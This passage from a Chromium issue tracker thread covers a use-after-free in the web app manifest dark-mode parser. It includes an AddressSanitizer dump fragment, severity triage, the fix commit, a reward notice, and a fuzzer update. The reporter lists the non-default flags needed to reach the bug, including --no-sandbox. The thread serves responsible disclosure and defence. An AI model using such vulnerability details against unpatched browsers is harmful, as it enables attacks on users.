  0x6030002ae100: f7 fa fd fd fd fa f7 fa fd fd fd fa f7 fa fd fd
=>0x6030002ae180: fd fa f7 fa fd fd fd fa f7 fa fd[fd]fd fa f7 fa
  0x6030002ae200: 00 00 05 fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x6030002ae280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x6030002ae300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x6030002ae380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x6030002ae400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==31653==ADDITIONAL INFO

```

### ha...@gmail.com (2024-05-11)

introduce commit
<https://chromium-review.googlesource.com/c/chromium/src/+/3935769>

### pe...@google.com (2024-05-11)

Setting milestone because of s2 severity.

### pe...@google.com (2024-05-11)

Setting Priority to P1 to match Severity s2. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### ad...@google.com (2024-05-11)

My comment in [#comment4](https://issues.chromium.org/issues/339788215#comment4) about severity is wrong - this is web app manifests rather than extensions. I don't know what the process is by which web app manifests are discovered or parsed, but bumping this up to s1 - if there are user steps required before this manifest is parsed, and those steps imply some level of user trust or decision or choice to install the app, then this can go back to s2.

### lo...@google.com (2024-05-12)

To hit this users have to enable the enable-experimental-web-platform-features flag and install a web app with the bad token in their manifest. So setting severity back to s2.

### ha...@gmail.com (2024-05-12)

I tested enabling some flags on mac os and it crashed without installing the application.No user interaction required

### ap...@google.com (2024-05-13)

Project: chromium/src
Branch: main

commit 12e31f1aef7d9c926f35980ea37348cda63e690d
Author: Louise Brett <loubrett@google.com>
Date:   Mon May 13 04:46:42 2024

    Fix UAF in manifest dark mode parsing
    
    Same fix as https://crrev.com/c/5528856
    
    Bug: b/339788215
    Change-Id: Iea94cd763c62cccbe0d0285376fc4f8b455d36b3
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5532123
    Reviewed-by: Matt Giuca <mgiuca@chromium.org>
    Commit-Queue: Louise Brett <loubrett@google.com>
    Cr-Commit-Position: refs/heads/main@{#1299889}

M       third_party/blink/renderer/modules/manifest/manifest_parser.cc

https://chromium-review.googlesource.com/5532123


### mg...@google.com (2024-05-13)

Thanks for reporting this, hackyzh003. The fix has landed in ToT.

Doing a bit of a damage assessment: from what I can tell, this code path can *only* be reached if the #enable-experimental-web-platform-features flag is enabled:

In manifest\_parser.cc, `ParseDarkColorOverride` is only called from inside the if statement: `if (RuntimeEnabledFeatures::WebAppDarkModeEnabled(execution_context_)) { ... }`. That should only be true when the DarkMode feature is enabled, which is currently never, unless the user has turned on experimental flags.

If this is true, the exploit is not exposed to the general public, only users who have turned on flags. It is also a render exploit, which limits the damage.

hackyzh003, could you confirm whether you were able to exploit this without any flags enabled, as implied by [comment #5](https://issues.chromium.org/issues/339788215#comment5)?

### ha...@gmail.com (2024-05-13)

yep, to reproduce this vulnerability you need to enable some flags
chrome.exe --enable-experimental-web-platform-features --enable-features=WebAppDarkMode --no-sandbox

### ad...@google.com (2024-05-13)

Based on this being exploitable only when non-default flags are used, adding the `Security_Impact-None` hotlist which is how we track that sort of bug.

### wf...@chromium.org (2024-06-12)

[vrp panel] hi, is it possible to add a fuzzer for this `manifest.json` file ?

### sp...@google.com (2024-06-13)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $7000.00 for this report.

Rationale for this decision:
$7,000 for report of memory corruption in a sandboxed process 


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2024-06-13)

Congratulations! Thank you for your efforts and reporting this issue to us.

### mg...@chromium.org (2024-06-14)

Congrats OP!

> [vrp panel] hi, is it possible to add a fuzzer for this manifest.json file ?

There already is one [here](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/modules/manifest/manifest_fuzzer.cc). I've just had a look and it seems that it has a [list of keyword strings](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/modules/manifest/manifest_fuzzer.dict) to help the fuzzer generate interesting cases, but "theme\_colors" was not on it. (Note that "theme\_colors" has since been removed, in part in response to this issue, so should not be added now.)

I've mentioned this to dmurph@ that perhaps there are other strings missing from this file which should be added for better coverage.

### ap...@google.com (2024-06-20)

Project: chromium/src
Branch: main

commit 9eacec0bde8cd297ccfa25ef2791cd7d12ce0085
Author: Daniel Murphy <dmurph@chromium.org>
Date:   Thu Jun 20 23:13:35 2024

    [PWA] Update manifest parser fuzzer with new fields and options.
    
    This change:
    - adds new display modes
    - fixes file_handlers
    - adds launch_handler
    - adds an icon url, and size specs
    
    R=mek@chromium.org
    
    Bug: 339788215
    Change-Id: Ie1956110f71c15907159ed6971573384d54731fb
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5646812
    Reviewed-by: Marijn Kruisselbrink <mek@chromium.org>
    Commit-Queue: Daniel Murphy <dmurph@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#1317676}

M       third_party/blink/renderer/modules/manifest/manifest_fuzzer.dict

https://chromium-review.googlesource.com/5646812


### pe...@google.com (2024-08-20)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/339788215)*
